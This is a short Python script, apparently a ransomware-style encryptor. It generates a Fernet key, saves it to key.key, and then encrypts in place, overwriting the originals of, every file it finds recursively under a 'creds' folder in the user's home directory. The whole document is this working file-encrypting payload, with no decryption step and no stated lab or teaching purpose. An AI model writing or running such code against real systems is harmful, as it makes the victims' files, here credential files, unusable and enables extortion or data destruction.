from cryptography.fernet import Fernet
import os
import glob

home_dir =  os.path.expanduser("~")
key = Fernet.generate_key()

with open("key.key", "wb") as keyFile:
    keyFile.write(key)

files = glob.glob(f'{home_dir}\\creds\\**\\*.*', recursive=True)

fernet = Fernet(key)

for file in files:
    with open(file, "rb") as tf:
        tf_byte = tf.read()

    tf_bytes_enc = fernet.encrypt(tf_byte)

    with open(file, "wb") as tf:
         tf.write(tf_bytes_enc)


#print(home_dir)


#for file in files:
    #print(file)